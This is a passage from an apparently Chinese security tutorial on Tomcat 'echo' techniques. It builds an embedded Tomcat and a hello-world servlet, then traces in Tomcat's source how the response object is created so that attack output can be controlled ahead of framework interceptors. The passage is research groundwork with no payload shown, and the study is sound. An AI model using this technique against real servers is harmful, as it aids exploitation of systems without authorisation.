style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.tomcat</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">tomcat-catalina</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- idea 识别不出来，要单独引入这个依赖 --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">${tomcat.version}</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="创建java代码文件夹">创建Java代码文件夹<a href="#创建java代码文件夹" class="hash-link" aria-label="创建Java代码文件夹的直接链接" title="创建Java代码文件夹的直接链接">​</a></h3>
<p>创建maven规范的代码存放文件夹<code>java</code></p>
<p><img decoding="async" loading="lazy" alt="创建java目录" src="/assets/images/image-20220209121444953-bdbe20c33f639305000e6c3bcfc117c2.png" width="2334" height="1256" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="创建启动类">创建启动类<a href="#创建启动类" class="hash-link" aria-label="创建启动类的直接链接" title="创建启动类的直接链接">​</a></h3>
<p>以<code>TomcatMain</code>为例，创建后启动访问<code>http://localhost:8080/</code>就可以看到hello world界面了</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.catalina.Context;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.catalina.LifecycleException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.catalina.WebResourceRoot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.catalina.startup.Tomcat;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.catalina.webresources.DirResourceSet;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.catalina.webresources.StandardRoot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.File;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/**</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * @author d4m1ts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class TomcatMain {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws LifecycleException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 启动tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Tomcat tomcat = new Tomcat();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        tomcat.setPort(8080);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        tomcat.getConnector();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 创建webapp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 创建上下文，后面要绝对路径</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Context context = tomcat.addWebapp(&quot;&quot;,&quot;/Users/d4m1ts/d4m1ts/java/TomcatEcho/src/main/webapp&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        WebResourceRoot resources = new StandardRoot(context);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        resources.addPreResources(new DirResourceSet(resources, &quot;/WEB-INF/classes&quot;,new File(&quot;target/classes&quot;).getAbsolutePath(), &quot;/&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        context.setResources(resources);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        tomcat.start();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        tomcat.getServer().await();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="启动后效果" src="/assets/images/image-20220209131918395-e87506fb81f8c5134b66100f19aee152.png" width="870" height="168" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="创建servlet">创建servlet<a href="#创建servlet" class="hash-link" aria-label="创建servlet的直接链接" title="创建servlet的直接链接">​</a></h3>
<p>直接在<code>java</code>目录上点击鼠标右键<code>New</code>可能没有<code>Create New Servlet</code>等选项来快速创建servlet-api，需要执行下列的一些操作来添加上（有的可以直接看下面创建部分）：</p>
<p>1、将src标记成Sources文件</p>
<p><img decoding="async" loading="lazy" alt="标记为sources文件" src="/assets/images/image-20220209130842383-ad6b7b67cfcf85c23f91db4bae8c7b72.png" width="2036" height="1672" class="img_ev3q"></p>
<p>2、配置source root</p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>备注</div><div class="admonitionContent_BuS1"><p>我的servlet写在src\main\java里，所以就勾选第一个。要是打算在多个文件下Create New Servlet ，那就把src的都勾上。</p></div></div>
<p><img decoding="async" loading="lazy" alt="设置source root" src="/assets/images/image-20220209131235762-bdb01a7d4174c4b9168f0c9012fca34e.png" width="2048" height="1686" class="img_ev3q"></p>
<hr>
<p><strong>快速创建servlet：</strong></p>
<p><img decoding="async" loading="lazy" alt="创建Servlet" src="/assets/images/image-20220209131527653-03fa915fbc405d5d89625edef506f541.png" width="1336" height="1598" class="img_ev3q"></p>
<p><strong>编写代码：</strong></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.ServletException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.annotation.WebServlet;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServlet;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletRequest;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletResponse;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.PrintWriter;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@WebServlet(name = &quot;HelloServlet&quot;, urlPatterns = &quot;/hello&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class HelloServlet extends HttpServlet {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        response.setContentType(&quot;text/html&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        PrintWriter writer = response.getWriter();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        writer.write(&quot;hello world&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        writer.flush();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="实现效果" src="/assets/images/image-20220209132008687-cc35dae4bd543c78f0a0012d549154d2.png" width="930" height="136" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="servlet过程分析">servlet过程分析<a href="#servlet过程分析" class="hash-link" aria-label="servlet过程分析的直接链接" title="servlet过程分析的直接链接">​</a></h2>
<p>在我们编写的servlet处下个断点，然后用浏览器访问，观察调用栈</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">doGet:18, HelloServlet</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:634, HttpServlet (javax.servlet.http)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:741, HttpServlet (javax.servlet.http)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:199, StandardWrapperValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:528, AuthenticatorBase (org.apache.catalina.authenticator)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:798, Http11Processor (org.apache.coyote.http11)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">process:66, AbstractProcessorLight (org.apache.coyote)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">process:810, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doRun:1500, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:748, Thread (java.lang)</span><br></span></code></pre></div></div>
<p>可以看到：</p>
<ul>
<li>1-3行是servlet处理过程</li>
<li>4-5行是filter处理过程</li>
<li>再向下就是tomcat的各种初始化过程</li>
</ul>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>备注</div><div class="admonitionContent_BuS1"><p>考虑到一些组件如<code>Shiro</code>、<code>JFinal</code>都有全局拦截器，如果我们想要非常通用，最好是在tomcat初始化的过程中就获取到<code>response</code>然后定制修改；</p><p>从上面的堆栈来看，就是从&gt;=第六行去寻找，越靠后就说明在初始化过程中越早，利用效果越好。</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="利用链挖掘">利用链挖掘<a href="#利用链挖掘" class="hash-link" aria-label="利用链挖掘的直接链接" title="利用链挖掘的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="response获取">response获取<a href="#response获取" class="hash-link" aria-label="response获取的直接链接" title="response获取的直接链接">​</a></h3>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>提示</div><div class="admonitionContent_BuS1"><ol>
<li>找到<code>response</code>对象</li>
<li>分析它如何初始化的（它是怎么来的）</li>
<li><strong>获取到它初始化后的实例</strong></li>
<li>通过它去控制输出</li>
</ol></div></div>
<p>平时我们要拿到一个内存中的实例对象，主要有两种方法：</p>
<ol>
<li>反射</li>
<li>回溯分析，应用是怎么初始化这个变量的，找关联函数、类、类变量等，再得到这个变量</li>
</ol>
<p>分析上面的调用栈，除去后期对<code>servlet</code>和<code>filter</code>的处理</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">invoke:199, StandardWrapperValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:528, AuthenticatorBase (org.apache.catalina.authenticator)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:798, Http11Processor (org.apache.coyote.http11)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">process:66, AbstractProcessorLight (org.apache.coyote)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">process:810, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doRun:1500, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:748, Thread (java.lang)</span><br></span></code></pre></div></div>
<p>从下向上挨着看，发现整个调用过程中最初使用到<code>response</code>的就是第8行的<code>service:798, Http11Processor (org.apache.coyote.http11)</code></p>
<p><img decoding="async" loading="lazy" alt="service:798, Http11Processor (org.apache.coyote.http11)" src="/assets/images/image-20220209135506259-e4bce62912a5e7782491c8470917c9ee.png" width="2474" height="1278" class="img_ev3q"></p>
<p>说明<code>response</code>和<code>resquest</code>在这之前就已经初始化了，所以我们需要向上回溯分析</p>
<p>查看这个<code>response</code>的定义，是<code>org.apache.coyote.AbstractProcessor</code>抽象类中的一个变量<code>Response response</code></p>
<p><img decoding="async" loading="lazy" alt="org.apache.coyote.AbstractProcessor#response" src="/assets/images/image-20220209140508186-c0a2e2114d5d04e01665e35bf483b7d9.png" width="1354" height="590" class="img_ev3q"></p>
<p>跟一下这个<code>response</code>是如何初始化的</p>
<p><img decoding="async" loading="lazy" alt="find usage" src="/assets/images/image-20220209140736739-0b536c99cc3e845fc1c851dbd2453f39.png" width="1702" height="228" class="img_ev3q"></p>
<p>发现是<code>AbstractProcessor</code>类的构造函数初始化，且<code>resquest</code>对象中包含了<code>response</code></p>
<blockquote>
<p>也就是说：我们后期如果拿到了<code>resquest</code>，也可以通过其拿到<code>response</code></p>
<p>注意：想要调用下面的<code>protected</code>构造函数，实际是需要调用上面的<code>publuc</code>构造函数，再通过上面的构造函数调用下面有<code>response</code>的构造函数</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20220209142613612" src="/assets/images/image-20220209142613612-755f6339bffbe07b1ad25b85e046c634.png" width="1558" height="764" class="img_ev3q"></p>
<p>而在<code>Http11Processor</code>类中要用到这个<code>protected</code>修饰的<code>response</code>变量，大概率是继承了<code>AbstractProcessor</code>，去看下，很明显</p>
<p><img decoding="async" loading="lazy" alt="继承关系" src="/assets/images/image-20220209141048057-03a4c95cbb61949248e4d8780c08bf99.png" width="950" height="140" class="img_ev3q"></p>
<p>所以我们还要找一下，<code>response</code>在<code>Http11Processor</code>类中是如何初始化的，看一下它的构造函数，是调用了父类<code>AbstractProcessor</code>的构造函数</p>
<p><img decoding="async" loading="lazy" alt="Http11Processor构造函数" src="/assets/images/image-20220209141702349-46e5f07ef42bd4948241933784e0200d.png" width="1708" height="446" class="img_ev3q"></p>
<p>所以<code>request</code>和<code>response</code>初始化是在<code>Http11Processor</code>的构造函数中初始化的</p>
<hr>
<p>所以现在思路比较明确，<code>Http11Processor</code>类初始化后，通过各种方法拿到<code>request</code>或者<code>response</code>实例即可，因为它们是通过<code>protected</code>来修饰的，所以可以通过当前类、同包和子类中来查找是否有相关的函数来获取这俩实例</p>
<p><img decoding="async" loading="lazy" alt="java修饰符" src="data:image/png;base64,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